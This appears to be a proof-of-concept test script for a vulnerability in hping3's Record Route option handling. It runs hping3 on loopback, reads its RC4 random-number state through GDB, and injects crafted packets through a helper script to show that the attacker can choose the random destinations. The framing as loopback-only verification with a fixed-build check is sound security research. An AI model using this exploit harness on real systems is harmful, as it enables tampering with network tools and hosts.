#!/bin/sh
# Permutation RR write: test full-destination prediction and reply-chosen
# byte schedule. Loopback only: --rand-dest 127.0.0.x probes 127.0.0.0/24 on lo.
# GDB only reads i.1, j.0 and rc4_sbox at select_next_random_dest entry.
# NO_INJECT=1 baseline; MODE=inc|dec; EXPECT=attack|baseline.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p evidence
PIN=e8ef2dd63b3f7b5e5d87d14a50bdc64c6befc94a8e21801f060708f2dcbb5e7b
FIX=70f0112d12c52d8661736de85e1a5155ba717ca63b09b471cb7aaa7f0ba846c7
BIN=${BIN:-plain-src/hping3}
MODE=${MODE:-inc}
EXPECT=${EXPECT:-attack}
RUN_TAG=${RUN_TAG:-$EXPECT-$MODE}
[ -x "$BIN" ] || { echo "$BIN missing"; exit 2; }
src="${BIN%/hping3}/display_ipopt.c"
sha=$(sha256sum "$src" | cut -d' ' -f1)
if [ "$EXPECT" = fixed ]; then
    [ "$sha" = "$FIX" ] || { echo "fixed source hash mismatch: $sha"; exit 2; }
else
    [ "$sha" = "$PIN" ] || { echo "pinned source hash mismatch: $sha"; exit 2; }
fi

tag="$RUN_TAG"
run="evidence/fullip-$tag-run.out"
gd="evidence/fullip-$tag-gdb.out"
cfg="evidence/fullip-$tag.gdb"
pidf="evidence/fullip-$tag.pid"
sudo -n rm -f "$pidf" "$run" "$gd"
: > "$run"; : > "$gd"

sudo -n sh -c "echo \$\$ > '$PWD/$pidf'; exec '$PWD/$BIN' -D -1 -G --rand-dest -I lo -c 24 -i 1 127.0.0.x" \
    > "$run" 2>&1 &
hp=$!
pid=0
for x in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
    [ -s "$pidf" ] && break
    sleep 0.1
done
pid=$(cat "$pidf" 2>/dev/null || echo 0)
[ "$pid" -gt 0 ] || { echo "no hping pid"; kill "$hp" 2>/dev/null; exit 2; }
mapline=$(sudo -n awk '$3=="00000000" {print $1; exit}' "/proc/$pid/maps")
base="0x${mapline%%-*}"
sym() { nm -n -S --defined-only "$BIN" | awk -v s="$1" '$4==s {print $1; exit}'; }
sl=$(sym rc4_sbox); il=$(sym i.1); jl=$(sym j.0)
[ -n "$sl" ] && [ -n "$il" ] && [ -n "$jl" ] || { echo "no rng symbols"; exit 2; }
sb=$(printf '0x%x' $((base + 0x$sl)))
ii=$(printf '0x%x' $((base + 0x$il)))
jj=$(printf '0x%x' $((base + 0x$jl)))
cat > "$cfg" <<EOF
set pagination off
set confirm off
file $PWD/$BIN
break select_next_random_dest
commands
silent
printf "STATE hit\n"
x/wx $ii
x/wx $jj
x/256xb $sb
continue
end
attach $pid
c
EOF
echo "tag=$tag pid=$pid pie_base=$base mode=$MODE expect=$EXPECT"

timeout 30 sudo -n gdb -q -batch -x "$cfg" > "$gd" 2>&1 &
gp=$!
sleep 4
if [ "${NO_INJECT:-0}" = 1 ]; then
    echo "NO_INJECT=1: baseline, no crafted frames"
else
    sudo -n python3 inject_rr_perm.py --pid "$pid" --ptr 255 --rr-len 255 \
        --mode "$MODE" --count 3 --gap 0.15
fi
wait "$gp"
kill "$hp" 2>/dev/null
wait "$hp" 2>/dev/null

python3 check_perm.py "$gd" "$run" --mode "$MODE" --expect "$EXPECT" \
    > "evidence/fullip-$tag-proof.out"
cat "evidence/fullip-$tag-proof.out"
grep -q 'PERM SUMMARY: .* PASS' "evidence/fullip-$tag-proof.out" && exit 0 || exit 1
